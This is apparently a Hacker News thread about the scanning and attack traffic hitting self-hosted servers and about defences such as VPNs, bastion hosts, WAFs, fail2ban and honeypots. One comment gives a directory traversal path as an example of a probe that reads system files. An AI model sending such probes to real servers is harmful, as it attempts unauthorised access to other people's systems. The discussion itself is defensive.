agorootparentprevOr just Wireguard itself. reply bradknowles 7 hours agorootparentprevUntil there is a new zero day on sshd. You want to keep these things behind multiple locked doors, not just one. For the servers themselves, you shouldn't be able to get to sshd unless you're coming from one of the approved bastion servers. You shouldn't be able to get to one of the approved bastion servers unless you're coming from one of the approved trusted sources, on the approved user access list, and using your short-lived sshd certificate that was signed through the use of a hardware key. And all those approved sources should be managed by your corporate IT department, and appropriately locked down by the corporate MDM process. And you might want to think about whether you should also be required to be on the corporate VPN. Or, to be using comparable technologies to access those approved sources. reply indigodaddy 12 hours agorootparentprevOne option could be to lock the port down to only your jump/bastion server source IP. reply bradknowles 12 hours agorootparentThat fails to when you lose that IP address, or you lose that server. reply PLG88 49 minutes agorootparentYes, better to make your bastion 'dark' without being tied to an IP address. This is how we do it at my company with the open source tech we have developed - https://netfoundry.io/bastion-dark-mode/ reply indigodaddy 12 hours agorootparentprevI suppose if you don’t have console access, sure. But inconvenient at worst imv. reply bradknowles 12 hours agorootparentIf you have a way around that bastion server, then at least you've got a backup. But then you also have to worry about the security of that backup. reply Filligree 12 hours agorootparentprev> something like basicauth I wish. I use basicauth to protect all my personal servers, the problem is Safari doesn't appear to store the password! I always have to re-authenticate when I open the page. Sometimes even three seconds later. reply eru 2 hours agorootparentHave you considered using a different browser? reply woleium 14 hours agorootparentprevor get your certificates using dns auth a week or so prior to exposing the service reply heywoodlh 17 hours agoparentprevWas looking into Certificate Transparency logs recently. Are there any convenient tools/methods for querying CT logs? i.e. search for domains within a timeframe Cloudflare’s Merkle Town[0] is useful for getting overviews, but I haven’t found an easy way to query CT logs. ct-woodpecker[1] seems promising, too [0] https://ct.cloudflare.com/ [1] https://github.com/letsencrypt/ct-woodpecker reply simonw 16 hours agorootparentSteampipe have a fun SQLite extension that lets you query them via SQL: https://til.simonwillison.net/sqlite/steampipe#user-content-... It uses an API provided by https://crt.sh/ reply high_priest 15 hours agorootparentQuerying crt.sh helped me identify a dev service I was supposed to take down, but forgot about it. Nice alternative use case :D reply j0hnyl 16 hours agorootparentprevhttps://certstream.calidog.io/ reply H8crilA 16 hours agorootparenthttps://crt.sh/ reply elashri 17 hours agoparentprevIt is also useful to rely more on wildcard certs, as it makes it difficult to determine from CT logs the specific subdomains to attack. reply bombcar 16 hours agorootparentThere's really no reason to avoid wildcard certs for your domains, unless you have so many subdomains that are managed by various business interests. I use LE wildcard certs and they're great, you can use them internally. reply couchand 15 hours agorootparentIt seems like the principle of least power would apply here. There's value in restricting capability to no more than strictly necessary. Consider the risk of a compromised some-small-obscure-system.corporate.com in the presence of a mission-critical-system.corporate.com when both are issued wildcard certs. Wildcard certs are indeed a valuable tool, but there is no free lunch. reply baobun 11 hours agorootparentYou'd usually put a reverse proxy exposing the services and terminating TLS with the wildcard cert. The individual services can still have individual non-wildcard internal-only certs signed by an internal CA. These don't need to touch an external CA or appear in CT logs - only the reverse proxy/proxies should ever hit these, and can be configured to trust the internal CA (only) explicitly. reply nullindividual 15 hours agorootparentprevA compromised wildcard certificate has a much higher potential for abuse. The strong preference in IT security is a single-host or UCC (SAN) certificate. Renewing a wildcard is also unfun when you have services which require a manual import. reply dfc 12 hours agorootparentRenewing any certificate that requires a manual import is not fun. Why are wildcard certs less fun to manually import than individual certificates? reply nullindividual 11 hours agorootparentPresumably one purchases a wildcard for multiple distinct systems. reply dfc 10 hours agorootparentUsing them like that never occurred to me. I was thinking multiple sites on one host or vanity hostnames: dfc.example.com / nullindividual.example.com. etc. reply stefandesu 3 hours agorootparentprevYeah, I switched to wildcard certs at some point for this reason. reply supriyo-biswas 17 hours agoparentprevThese aren't attackers - they're usually services like urlscan.io and others who crawl the web for malware by monitoring CT logs. reply joshspankit 16 hours agorootparentThe thread is specifically talking about logs of attacks reply nemothekid 6 hours agoparentprevFun anecdote - I wrote a new load balancer for our services to direct traffic to an ECS cluster. The services are exposed by domain name (e.g. api-tools.mycompany.com), and the load balancer was designed to produce certificates via letsencrypt for any host that came in. I had planned to make the move over the next day, but I moved a single service over to make sure everything was working. Next day as I'm testing moving traffic over, I find that I've been rate limited by Lets Encrypt for a week. I check the database and I had provisioned dozens of certificates for vpn.api-tools.mycompany.com, phpmyadmin.api-tools.mycompany.com, down the list of anything you can think of. There was no security issue, but it was very annoying that I had to delay the rollout by a week and add a whitelist feature. reply pkulak 8 hours agoparentprevI host so many services, but I gave up totally on exposing them to the internet. Modern VPNs are just too good. It lets me sleep at night. Some of my stuff is, for example, photo hosting and backup. Just nope all the way. reply justaj 8 hours agorootparentIf you're the only one accessing those services, then why use a VPN instead of port mapping those services to localhost of the server, and then forwarding that localhost port to your client machine's localhost port via SSH? reply pkulak 7 hours agorootparentI didn’t understand any of that, sorry. Haha A VPN lets me access my stuff from my phone while out of the house, for example. reply throwbadubadu 1 hour agoparentprev> The take-away is, secure your new stuff as early as possible, ideally even before the service is exposed to the Internet. What? Ideally..before? Seriously? It is 2024.. and this was true even decades ago, absolutely mandatory. (Still remembering that dev that discovered file sharing in his exposed mongo instance (yes, that!! :D) without password only hours after putting it up.. \"but how could they know the host it is secret!!\" :D ). reply feitingen 4 hours agoparentprevI'm still getting crawlers looking for an old printer i got a letsencrypt certificate for. reply maccam912 17 hours agoparentprevSame! As soon as a new cert is registered for a new subdomain, I get a small burst of traffic. It threw me off at first assuming I had some tool running that was scanning it. reply snowwrestler 16 hours agoprevBack when I started managing self-hosted sites, I would look through access logs as well. We even had an IDS for while that would aggregate the data and flag incoming attack attempts for us. Eventually I stopped proactively reviewing logs and stopped paying for the IDS. It was a waste of time and a distraction. It's not hard to find really useful content that summarizes common vulnerabilities and attacks, and just use that to guide your server management. There are a ton of best practices guides for any common web server technology. Just executing these best practices to 100% will put you way ahead of almost all attackers. And then the next best use of your time and resources is to prioritize the fastest possible patching cadence, since the vast majority of attacks target disclosed vulnerabilities. Where logs are super helpful is in diagnosing problems after they happen. We used log analysis software to store and search logs and this was helpful 2-3 times to help find (and therefore address) the root cause of attacks that succeeded. (In every case it turned out to be a known vulnerability that we had been too slow to patch.) reply gnyman 15 hours agoparent> In every case it turned out to be a known vulnerability that we had been too slow to patch. Yes. This is why relying on \"patching\" is a bound to fail at some point. Maybe it's a 0-day, or maybe the attackers are just quicker. The solution to this is defence in depth, and it's very easy for most services, especially when self-hosting personal things. Few tips most people can do is. Put up a firewall in front or put it behind VPN/tailscale. Hide it in a subfolder. The automated attacks will go for /phpmyadmin/ , putting it in /mawer/phpmyadmin/ means 99.9% of the attackers won't find it. (This is sometimes called security by obscurity and people correctly say you should not rely on it, but as a additional layer it's very useful). Sandbox the app, and isolate the server. If the attackers get in, make it hard or impossible for them to get anywhere else. Keep logs, they allow you to check if and how you got attacked, if the attack succeeded and so on. Depending on the service, pick one or more of these. Add more as necessary. The key thing is that you should not rely on any ONE defence, be it keeping it patched or firewalled, because they will all fail at some point. reply jmb99 13 hours agorootparent> This is sometimes called security by obscurity and people correctly say you should not rely on it, but as an additional layer it's very useful. Anyone who thinks “security by obscurity” is useless should try reverse engineering some properly obfuscated executables (or even code). Obscurity is absolutely useful; definitely not a complete solution by itself, but a very useful component to a security solution. reply bradknowles 12 hours agorootparentThe term \"security by obscurity\" or \"security through obscurity\" implies that ONLY obscurity is being used to provide the security in question. Like leaving a totally unsecured server on your network with root access available with no password, and telnet or sshd open on a high numbered port instead of the regular ones. Obscurity is a useful tool to be added on top of real security, and can help reduce the random baseline doorknob jiggling attacks, where people are just scanning the standard ports. But obscurity by itself is not enough to provide any real security beyond that. reply bruce511 4 hours agorootparentYou are completely correct. For a level 3 person. Level 1 : I don't know what I'm doing, so I'll invent stuff only I know in the expectation that'll be enough. This person is told (with good reason) that security by obscurity is no security at all. Level 2. They got the above message, so do everything right. Setups, firewalls, permissions, and so on. They are proud of their expertise and lecture level 1s all day long. Level 3. Understand that all the fundamentals need to be done right. Add addional obscurity onto that because it doesn't hurt, and can filter out some useless traffic. (These folk should also lecture level 1 with the simplified message, but can explain the benefits to level 2.) The problem with HN threads like these is that I don't know who's giving the advice. Level 1 2 or 3. Equally readers could be any level. Which might be dangerous if they are level 1. IF you ARE level 1, learn the correct way to secure things first. THEN feel free to add obscurity onto that if you like. reply Gibbon1 12 hours agorootparentprevReminds me of a friend that does security stuff. He says never store or transmit keys in a useful form. Bonus using munged keys will trigger alarms. reply PLG88 45 minutes agorootparentprev\"and if at all possible keep them off the public internet\", this is the way. I would recommend going beyond a VPN to implement zero trust networking which does outbound-only connections so that its impossible to be subject to external network attacks. Tailscale does part of that, other exist, such as the open source project I work on - https://github.com/openziti reply citizenpaul 13 hours agorootparentprev>security by obscurity I detest this phrase right up there with \"fake it till you make it\". All security is by definition obscurity. Just a meaningless platitude that rhymes. I suppose un-formalized un-proofed security practices will eventually be broken or counting on hackers not to do any investigation of your system will get you hacked, doesn't roll off the tongue though. reply rablackburn 9 hours agorootparent> All security is by definition obscurity. Can you expound on this? For example, if I add a 30 second lockout after failed authentication attempts I don’t see how that comes under any non-tortured definition of “obscurity”. reply citizenpaul 5 hours agorootparentThe lockout doesn't exist without the authentication system in the first place. Which exists to keep people from knowing the information. Its a subset of something that is needed for obscuring the information in the system from anyone that should not see it. I really feel dirty trying to justify this level of nerdy pedanticness. I'm sure you can poke some holes from my off the hip internet comment if you really want to I'm not trying to be academic. I mostly fueled this comment with my distaste for that other platitude. reply leononame 3 hours agorootparentI think you miss the point of security through obscurity. It's not about keeping the information itself obscure (in your example login information), but rather the method. For example, your password hashing mechanism. If you have a strong password hash function, you don't need to obscure which hash function you use (otherwise, open source software couldn't even exist in certain areas). However, if your security relies on you obfuscating your broken, home-made hash function that only hashes the first three letters of the password, you're not really secure. Security through obscurity is an attempt at securing an otherwise unsecure system by hiding or disguising the implementation. That being said, obscuring parts of an otherwise secure system is fine as an additional layer, especially if you just want to deter script kiddies that always hammer the same endpoints reply hanszarkov 8 hours agorootparentprevyes, also add cryptographic complexity, don't think that qualifies either. reply citizenpaul 5 hours agorootparentCryptographic complexity is math if you ask me? A hammer is not construction, it's a tool used by construction? reply dandrew5 16 hours agoparentprev> And then the next best use of your time and resources is to prioritize the fastest possible patching cadence, since the vast majority of attacks target disclosed vulnerabilities. Just curious, do you leverage any tools to decide when to patch or is it time-interval based? We currently attempt[0] to update our packages quarterly but it would be nice to have a tool alert us of known vulnerabilities so we can take action on them immediately. [0] \"Attempt\" meaning we can't always upgrade immediately if the latest version contains difficult-to-implement breaking changes or if it's a X.0.0 release that we don't yet trust reply eyegor 15 hours agorootparentBesides pointing pentester tools like metasploit at yourself, there are some nice scanners out there. Examples in no particular order: https://github.com/quay/clair https://github.com/anchore/grype/ https://github.com/eliasgranderubio/dagda/ https://github.com/aquasecurity/trivy So then you set up something like a cron job to scan everything for you and email the results once a week or whatever if you don't want to monitor things actively. reply BLKNSLVR 8 hours agorootparentI just setup GVM / OpenVAS[0] to work out where I need to put in some maintenance work, how does that rate as worthwhile in comparison to those you've listed above? (which I will also look into). (not a fan of the effort Greenbone have gone to for hiding their community edition and promoting their commercial products) [0]: https://greenbone.github.io/docs/latest/22.4/container/index... reply dandrew5 13 hours agorootparentprevThanks for these. I should have clarified, I'm more interested in something that will alert me when newly-discovered vulnerabilities surface. The systems I maintain are protected [enough] today but a new hack could drop that doesn't make mainstream media and I may not hear about it. We have annual security audits but it would be nice to patch things immediately. Aside from subscribing to a security forum/discord/slack, I'm wondering what other methods folks are employing to solve this. reply bradknowles 12 hours agorootparentKeep your pentesting tools up-to-date. Run them against yourself on every single deployment, if you can. Don't just run them quarterly because that's all that your PCI-DSS requirements say you have to do. Integrate security code scanning tools into your CI/CD process. Tools like Dry Run Security, or something comparable. There's much more, but that has to do with how to run your CI/CD systems and how to do your deployments in general, and less to do with security aspects thereof. reply layer8 11 hours agorootparentprevThe simplest is to only use packages from a distribution like Debian and run unattended-upgrades or equivalent for the security-updates repository. They usually fix vulnerabilities in less than a day. reply snowwrestler 7 hours agorootparentprevI’m out of the self-hosting game now, but back in the day we just tried to keep up on security announcements. reply woodruffw 18 hours agoprevThe author says they aren’t a security person, so to correct a minor thing: the first examples are credential and configuration discovery, not directory traversal. The latter, to the best of my knowledge, is reserved for techniques where the attacker “escapes” the webroot or otherwise convinces the server to serve things outside of its normal directories. reply 3abiton 1 hour agoparentThanks for the clarification! reply asynchronous 11 hours agoparentprevIt’s technically both if they’re performing an include file that wasn’t supposed to be hosted- ex. “/../../passwd/etc” reply evantbyrne 16 hours agoprevThe elephant in the room is that–at least in my experience–a lot of these attacks come from hostile nation states. This is going to be controversial, but one may find it useful to block entire IP ranges of problematic states that you cannot do business with. I was able to block 100% of probes to one of my new services by doing this. reply nerdponx 15 hours agoparentIt's not an elephant, it's just that many people aren't willing to block legitimate users from those regions. reply evantbyrne 13 hours agorootparentAmerican websites don't typically have customers dialing in from North Korea. Just saying that IP blocking is something more businesses should consider. Traffic can also be routed to different subdomains for businesses that need to provide a subset of services to a region. reply tjbiddle 8 hours agorootparentMost admins blocking regions aren't so selective; rather than blocking North Korea - they'll block everything not USA. As an American living abroad, it's not uncommon for me to not be able to access a website I need (or want) to, and I need to pop onto my VPN. reply redcobra762 7 hours agoparentprevIsn’t blocking regions just going to block the legitimate traffic, and push determined adversaries to use proxies? reply oblio 7 hours agorootparent> Isn’t blocking regions just going to block the legitimate traffic I imagine blocking North Korea, Iran, etc will probably impact 0.5% of traffic and 0.001% of revenue for most sites. > and push determined adversaries to use proxies? That might mean you're left with 10% of the previous attackers so it could be worth it. reply redcobra762 6 hours agorootparentIs it? Which of these \"attackers\" are you most concerned with? I hesitate to even call them \"attackers.\" They're jiggling your front door knob, at worst. reply evantbyrne 5 hours agorootparentThis is actually a decent analogy because a person sneaking around the neighborhood trying to open doors should be considered a threat. Nothing good happens when someone like that gets inside. reply redcobra762 5 hours agorootparentEh, yeah, but at the same time, can you jiggle doorknobs from halfway around the world, and is it so overwhelmingly common that within minutes of every door being built, dozens of people come by just to jiggle the knob? It's just so unbelievably common and so frequently harmless that it's hard to take all that seriously. But you're right, it is a threat, I won't deny that. reply macintux 15 hours agoparentprev15+ years ago I was reviewing server logs for small, local businesses we hosted and came to the conclusion we should just block all APNIC IP addresses. reply acherion 12 hours agorootparentAPNIC includes Australia, New Zealand, Japan, Taiwan and Singapore – did you block addresses from there too? reply macintux 12 hours agorootparentGiven the length of time since then, I have no recollections beyond making the decision reply 1B05H1N 17 hours agoprevI work in application/product security and have managed WAFs for multi-billion dollar companies for many many years. Move DNS to Cloudflare and put a few WAF rules on your site (managed challenge if bot score less than 2 / attack score == x). I doubt you'll even pay anything, and it will resolve a lot of your problems. Just test it before moving it to production please (maybe setup a test domain). Remember, a WAF is not an end-all be all, it's more of a band-aid. If you app isn't hardened to handle attacks, no amount of advanced WAF/bot protection will save it. Message/email me if you need help. reply CharlesW 17 hours agoparentI was unfamiliar with this, so for anyone who's in a similar position: https://blog.cloudflare.com/waf-for-everyone/ The Free Managed Ruleset appears to be deployed by default, and Cloudflare keeps a changelog here: https://developers.cloudflare.com/waf/change-log reply asabla 17 hours agoparentprevUsually I only manage internal facing applications these days, which makes the attack surface greatly reduced compare to public ones. But since you seem to have a lot of knowledge in this area. Have you manage solutions which also includes infrastructure in Azure combined with Cloudflare? And if so, any suggestions on things people usually miss? except for the usual stuff of OWASP and what not reply ozim 15 hours agoparentprevPutting WAF on app and calling it a day is indeed putting lipstick on a pig. I can imagine that might be needed if some company for some reason has to run some not really up to date stuff but yeah it is just a bandaid. reply 418tpot 17 hours ago [flagged]parentprevnext [13 more] Yes, that's just what the internet needs is even more websites centralized behind Cloudflare. Why do we even bother with TLS anymore if we're going to give them unencrypted access to practically all of our internet traffic. Hacker news is so funny, they complain about the amount of power we've allowed Google, Amazon, and Microsoft to have, and then go right around and recommend putting everything behind Cloudflare. Once Cloudflare starts using attestation to block anyone not on Chrome/iOS Safari it'll be too late to do anything about it. reply dang 4 hours agorootparentCan you please not post in the flamewar style? It's not what this site is for, and destroys what it is for. You're welcome to make your substantive points thoughtfully but it needs to be within the rules. If you wouldn't mind reviewing https://news.ycombinator.com/newsguidelines.html and taking the intended spirit of the site more to heart, we'd be grateful. reply chaxor 13 hours agorootparentprevAgreed We should be suggesting self hosted and decentralized solutions to website hosting and file hosting. On that note, does anyone have any secure methods of providing serving a file from your computer to anyone with a phone/computer that doesn't require them downloading/installing something new? Just a password or something? Magic-wormhole almost seems great, but it requires the client to install wormhole (on a computer, not phone), and then type specific commands along with the password. Is there a simple `iroh serve myfile.file` from server and then client goes to https://some.domain.iroh/a086c07f862bbe839c928fce8749 and types in a password/ticket you give them? That would be wonderful. reply albuic 1 hour agorootparentSharedrop or p2p sharing site like this one. reply redcobra762 7 hours agorootparentprevIt’s kind of an absurd notion to think the Internet would just allow Cloudflare to make any kind of unilateral decisions like what you suggest. reply esafak 14 hours agorootparentprevYou criticize but don't offer suggestions. What do you use instead of Cloudflare? reply NicoJuicy 12 hours ago [flagged]rootparentprevnext [3 more] > Once Cloudflare starts using attestation to block anyone not on Chrome/iOS Safari it'll be too late to do anything about it. That's just plain bs... Eg 1) they have customers and their customers want protection, with minimal downsides. 2) Cloudflare is the only one with support for Tor. I'm 100% sure you didn't knew that. What \"examples\" do you have to blame them for something they aren't doing? Based on what? I'm getting tired of people blaming Cloudflare for providing a service that no one else can provide for free to small website owners => DDOS protection. reply dang 4 hours agorootparentCould you please stop breaking the site guidelines? You've unfortunately been doing it repeatedly. It's not what this site is for, and destroys what it is for. You're of course welcome to make your substantive points thoughtfully while staying within the rules. If you wouldn't mind reviewing https://news.ycombinator.com/newsguidelines.html and taking the intended spirit of the site more to heart, we'd be grateful. reply pid1wow 11 hours agorootparentprevWhat do you mean? On Tor I get a Cloudflare block just from clicking 2 links on the front page of HN: http://forums.accessroot.com/index.php?showtopic=4361&st=0 >Please wait while your request is being verified... I can't remember any day I didn't get a Cloudflare block. Even on bare IP sometimes. WAFs are security theater. reply solumunus 17 hours agorootparentprevnext [4 more] > Hacker news is so funny, they complain about the amount of power we've allowed Google, Amazon, and Microsoft to have, and then go right around and recommend putting everything behind Cloudflare. It’s almost as if those saying contradictory things are actually different people despite being on the same website. But it can’t be that, surely? Truly a perplexing phenomenon that I hope someone can one day explain. reply 418tpot 17 hours agorootparentFair, although I know quite a few people that hold both of these opinions simultaneously because I've met them in person. It's only after I point out their hypocrisy do they even realize what a danger Cloudflare poses to the free and open internet. I suspect it's because hating on Google is in vogue, and so is recommending Cloudflare. reply BLKNSLVR 8 hours agorootparentI'm going to try to provide / justify my potentially hypocritical viewpoint: I use Cloudflare (free tier) in front of the very few and almost entirely unused websites that I run. I believe that the service they provide is useful for protecting the IP addresses of the servers on which the content is hosted, whilst also providing some amount of protection from malicious traffic. I also agree that centralisation of services is a big problem for the future of the internet. My position is that, whilst there seem to be increasing voices / examples of Cloudflare's (potential in) acting against the nebulous notion of \"spirit of the internet\", for me they certainly haven't reached the \"evil\" stage. I'm also of the understanding that it's Cloudflare customers that choose to block access from Tor or VPS IP address ranges and / or add Captcha's or other bothersome verification. True Cloudflare enable it and make it possible, but the administrators of the website that you're trying to visit have made the choice to make it more difficult for you to access their content; not Cloudflare themselves. I would prefer there to be similar-scale alternatives to Cloudflare as a kind of a middle-ground decentralisation of centralisation. I'm sure there are alternatives, but I'm not yet motivated enough to even consider starting the research process. If Cloudflare start selling visitor analytics to data brokers, however, very fast goodbye. reply jopsen 12 hours agorootparentprevGiven how Cloudflare works I imagine that there are alternative services offering the same thing. Probably not as cheap. AWS can put a WAF and CDN infront of your site too. And migrating from one service to another isn't much more work than moving DNS records. Just saying, it's not the same level of vendor lockin as using dynamodb or whatever. reply simpaticoder 17 hours agoprevThank you! I've been self-hosting for about a year running a 400-line http/s server of my own design, and it's remarkable all the attacker traffic my 3 open ports (22, 80, 443) get, although I've never taken the time to analyze what the attackers are actually trying to do! This post fills in a LOT of blanks. Would be cool to do the same thing for the weird stuff I see in /var/log/auth.log! It's crazy that attackers would bother with me since the code is entirely open source and there is no server-side state. The best outcome for an attacker would be root access on a $5/mo VPS, and perhaps some (temporary) defacement of the domain. A domain no-one visits! reply epcoa 17 hours agoparentThese are all automated bots. No one is “bothering”. You open the 3 most well known ports you’re going to get connections. They don’t know what you’re running nor do they care. reply simpaticoder 16 hours agorootparentBy \"bothering with me\" I mean \"add my IP to the long list of IPs they are scanning\". By the way, I find it annoying that my logs get filled with this kind of trash. It has the perverse effect of making me long for something like Google Analytics since they rarely if ever bother running a javascript runtime. reply epcoa 16 hours agorootparentThat long list isn’t curated, it’s every publicly routable IPv4 address. It really does not take long to run some canned probes against 3.7 billion addresses. Making your service IPv6 only tends to cut down on this traffic. You’re anthropomorphizing a script on some botnets. reply ericpauley 14 hours agorootparentThis isn’t entirely true. Many scanners do preference specific IP ranges such as cloud providers. Cloud IPs receive substantially more scanning traffic than darknet IPs or even random corporate IPs. reply iramiller 11 hours agorootparentprevIPv6 only? If you have a DNS record for that your are still not making it very difficult for scripts to find you. reply epcoa 9 hours agorootparent> If you have a DNS record for that your are still not making it very difficult for scripts to find you. If you put your ssh server or something on an uncommon subdomain how will these scripts find it? If you are on @ or some common name sure, otherwise no. reply ozim 15 hours agorootparentprevNo one is maintaining a list they just scan all. Scanning every IPv4 there is on a single port takes minutes. reply dotancohen 16 hours agoparentprevAccess to your VPN is a great way to launch attacks on other machines, and to add another layer to covering his tracks. Not to mention hosting malware to be downloaded to other places, and even a crypto miner. reply mianos 14 hours agorootparentI set up a honeypot once and logged the passwords of created accounts. I then used 'last' to find the incoming ip. I then used ssh to try and connect to the originator (from an external box). I went back 5 jumps until I got to a windows server box on a well known hosting service that I could not get into. Lots of what looked like print servers and what looked like linux machines connected to devices. Maybe just the exploit at the time. reply icameron 15 hours agoparentprevConsider blocking 22 except whitelist your own IP. My ISP changes my IP rarely in practice and when they do I can log into the hosting web admin panel and update the rule. reply petee 15 hours agorootparentJust accept key-only logins, everything else becomes noise. I also limit concurrent connections, which significantly reduces data usage during aggressive attacks reply velcrovan 18 hours agoprevI make a point of running fail2ban on my servers and will even add custom jails to catch attacks specific to the types of functionality I may be exposing on the site(s) hosted on them. But it’s been a long time since I checked whether fail2ban’s other defaults are still comprehensive enough to block the most common attacks. I guess I’ll bookmark this link for when I get around to doing that. reply Palomides 18 hours agoparentif your systems have any of these easily targeted vulnerabilities exposed, fail2ban won't save you reply velcrovan 18 hours agorootparentfair point, the main reason I use fail2ban is to limit traffic from malicious activity rather than letting the attempts run rampant and unchecked. reply creeble 15 hours agorootparentIf it makes you feel good, do it. It can also cut down on log noise a bit, for when you’re really looking for something. But in general, I’ve given up on caring about the routine “attacks” listed in all the logs. If you have good security, they don’t matter. And if you don’t, they don’t matter either. reply geraldhh 15 hours agorootparentprevcaring for pointless attacks is more work and bears more risk reply jbverschoor 14 hours agorootparentprevIn addition, you can have nginx filters to check for simple patterns (php on a non-php site? -> instant ban). Too many 404s? -> instant ban. reply BLKNSLVR 8 hours agorootparentI have recently started using my own sledgehammer-subtle approach of detecting (what I refer to as) Uninvited Activity on any port not offering a service, and straight-up banning the source IP (indefinitely at the moment) from accessing any actual service ports. Over the few months I've had it running I've needed to progressively create failsafes for IP addresses that I know are trustworthy so I don't lock myself out. I've also started tiering the importance of blocking based on different sets of ports which are being probed. I've also discovered that there's a significant amount of Uninvited Activity coming from \"security\" companies in their pro-active scanning of the entire IPv4 space - which I don't trust at all and ban with prejudice. It's messy and I need to update and add many explanations, but it's on Github if anyone wants a laugh: https://github.com/UninvitedActivity/UninvitedActivity (I'm aware of various limitations and footguns inherent in this un-subtle approach but, as another commenter elsewhere alluded to, \"it makes me feel better\". I also think that a fair bit of processing volume can be taken off IDS' if a heap of \"known garbage\" traffic is blocked prior - it's all about tiers). reply warkanlock 18 hours agoprevIf anyone is receiving these types of logs on AWS, please do yourself a favor and place AWS WAF in front of your VPC. It's not expensive and can significantly help you, saving you from many headaches in situations like this. While it might not block everything that arrives at your service, it can be a great help! reply anamexis 18 hours agoparentThis is a good suggestion, but careful with the default rulesets. We turned on AWS WAF (in our case, the motivation was just SOC 2 compliance). There were a few overzealous rules that subtly broke parts of our app. There were request body rules that did things like block requests that contained \"localhost\" in the request body. There was also a rule that blocked requests without a User-Agent header, which we were not previously requiring on API requests, so we broke our entire API for a few users until we figured that out. reply everfrustrated 17 hours agorootparentIn my experience WAFs are not something that one should ever \"just turn on\". Complete due diligence is required to fully understand and realise the impact of the rules and should be tested like any software change by going through a testing phase. Ideally software teams should be fully trained and be responsible for their lifecycle. reply macNchz 17 hours agorootparentYes you need to be familiar with the rulesets being applied, and prepared to closely monitor what is being blocked. Ideally I think I’d roll it out one ruleset at a time to limit the number of potential issues being introduced at once. Had a fun one after turning on the AWS WAF with some default rules–a small number of users reported they couldn’t upload new logo images anymore. Turned out some Adobe product was adding XML metadata to the image files, which the WAF picked up and blocked. reply arter4 16 hours agorootparentprevAgree. There are so many ways WAF rules can unintentionally block legitimate traffic. From very long URLs (is that a DoS attempt?), to special characters in a POST with a file upload (is that = part of a SQL injection attempt or is that just part of a base64 encoded file?) and so on. reply marcosdumay 17 hours agorootparentprevJust to add, but only testing will never work well enough for something like this. This is one of the cases where you must understand what you are doing. There's no technique for doing it mindlessnessly. reply nullindividual 15 hours agorootparentprevI use the Azure equivalent of the AWS WAF but I have no direct experience with AWS WAF. Azure WAF leverages the OWASP ruleset[0] and many of those rules throw false-positives, SQL-related rules being one of the top offenders. As you note, it requires adjustment due to overzealous rules. OWASP has Paranoia Levels[1] which allow you to be more targeted. [0] https://github.com/coreruleset/coreruleset [1] https://coreruleset.org/20211028/working-with-paranoia-level... reply fabian2k 17 hours agoparentprevNone of the attacks listed in the post would be an issue for any kind of modern web application. Why should I add a WAF for this? reply bogota 17 hours agoparentprevIt is not that easy as using the AWS WAF with default rules for our application led to many valid requests and IPs being blocked. You need to know what is being blocked and verify at first or you will in some cases be losing customers. reply CubsFan1060 17 hours agorootparentYour best plan is to start with all the rules in count mode. Let that sit for awhile and analyze anything that was counted. As you feel good about it, slowly start to move things into block. reply mango7283 3 hours agorootparentProblem is when you get owned during that window and get slammed for not blocking sooner. Then you block sooner and get slammed for blocking too soon. Repeat for 1000 web services. reply mac-chaffee 11 hours agoparentprevIn actuality, WAFs hurt more than help. They give a false sense of security since they are so easily bypassable, plus they have a significant performance cost and a significant chance of blocking legitimate traffic: https://www.macchaffee.com/blog/2023/wafs/ reply remram 14 hours agoparentprevWAF tends to ban widely, sometimes for dubious reasons. For example, researchers at my university study Twitter data, and the mere fact of following links from a small random sample of tweets means that our university's IPs are blocked by most WAF. reply mkoryak 18 hours agoprevSometimes I think it might be fun to setup an express server that correctly responds to one of these attacks just so I can waste someones time. But doing that would also waste my time. reply cyberlurker 17 hours agoparenthttps://en.wikipedia.org/wiki/Tarpit_(networking) reply emmanueloga_ 15 hours agorootparentAh, tarpit refers to a system that purposely slows down answers, while honeypot is a system that _looks like_ it's delivering the goods but it is just a trap. I'm sure they mostly refer to the same thing, though. -- https://en.wikipedia.org/wiki/Honeypot_(computing) reply gnyman 15 hours agoparentprevIt's mostly wasted time but I feel it's slightly more beneficial than playing video games (which I also do) so I do it for fun sometimes. [1] [2] [1] https://infosec.exchange/@gnyman/109318464878274206 [2] https://nyman.re/super-simple-ssh-tarpit/ reply azinman2 18 hours agoparentprevIt’s all automated; not you’re not really wasting an actual persons time. reply pnw 17 hours agorootparentIt does waste their time if your honeypot is constantly responding with legitimate looking but fake credentials. Presumably the hacker is going to try to use them? It’s the same idea used by anti-spam activists back in the day with software that would flood spam website forms with fake but realistic looking info, so the real data would be buried in the noise. reply runeb 7 hours agorootparentThat part is also automated reply klysm 18 hours agoparentprevHoneypots are good fun reply patja 18 hours agoprevFail2ban doesn't help when the attacker/abuser rotates their IP address constantly. I now look for aberrations in a few http headers they often neglect to spoof in their attempt to act like an honest human. reply lofaszvanitt 16 hours agoparentWhen will people forget about fail2ban already? It's an old, cumbersome, useless tool. reply finnjohnsen2 17 hours agoparentprevfail2ban has calmed attacks (ssh dictionary mostly) from 100-1000s per day to about a dozen, on my private rpi thing. I assume most attackers are looking for low hanging fruit with little (cheap) effort. reply mianos 13 hours agoparentprevBit they don't. The most of the ssh attacks come from the same 10 addresses from China Telecom. Sometimes they don't change for.months. Maybe it is some country sponsored attack organisation or maybe just carrier grade nat. reply boringuser2 17 hours agoparentprevThese attackers don't have inexhaustible resources. reply logifail 17 hours agorootparentIndeed, but neither do you. Be very careful that fail2ban isn't actually exhausting your own resources faster than you believe you're exhausting the attackers' resources... https://www.google.com/search?q=fail2ban+resource+usage reply quesera 17 hours agorootparentprevI've recently logged credential stuffing attacks coming from over 100K distinct IPv4 addresses to a small backend API. reply Aachen 16 hours agorootparentThis interests me a lot as we do security but don't run a big service ourselves and so don't have data on what motivated attackers' behavior is exactly. How many active users (to an order of magnitude; no need for precise numbers of course) does this service have? 100k IPs sounds pretty costly to burn, so I'm curious how important one needs to be before that's considered worth it. And could you say what type of IP addresses those were? Did it look residential such as from compromises computers (botnet), do they rent lots of IP addresses temporarily from aws/netcup/alibaba, or is it a mix such that neither category has the overwhelming majority? If it's all server IP ranges for a service where end users normally log in, you could apply entirely different rate limits to those than to residential IPs, for example. Hence I'm wondering how these cred stuffing attacks are set up reply quesera 16 hours agorootparentIt was a mix. Lots of apparent botnets (residential service scattered across many providers and networks), but also healthy chunks of colo/SaaS netblocks as well. And of course a ton of open proxies. reply Aachen 9 hours agorootparentThanks! reply vntok 17 hours agorootparentprevRate-limit after x failed logins on either source IP, username and password. Just provide a realworld sidechannel escape hatch for legitimate users (ex: phone or email). Barely anyone will actually use it. reply quesera 17 hours agorootparentWe had to go further. The attacks were from arbitrary IPs, and were working through a huge list of leaked username/password 